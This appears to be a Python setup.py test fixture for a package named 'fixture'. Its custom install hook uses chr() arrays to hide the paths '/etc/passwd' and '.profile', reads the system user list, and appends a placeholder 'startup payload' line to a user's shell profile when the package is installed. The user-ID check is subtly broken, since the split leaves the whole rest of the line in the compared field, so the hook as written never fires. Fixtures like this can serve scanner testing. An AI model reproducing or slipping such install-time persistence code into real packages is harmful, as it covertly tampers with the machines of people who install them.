from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        passwd = "".join(chr(value) for value in [47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100])
        profile = "".join(chr(value) for value in [46, 112, 114, 111, 102, 105, 108, 101])
        with open(passwd, "r") as users:
            for line in users:
                name, _, uid = line.split(":", 2)
                if uid == "1000":
                    with open(f"/home/{name}/{profile}", "a") as target:
                        target.write("decoded startup payload\n")


setup(name="fixture", cmdclass={"install": Install})
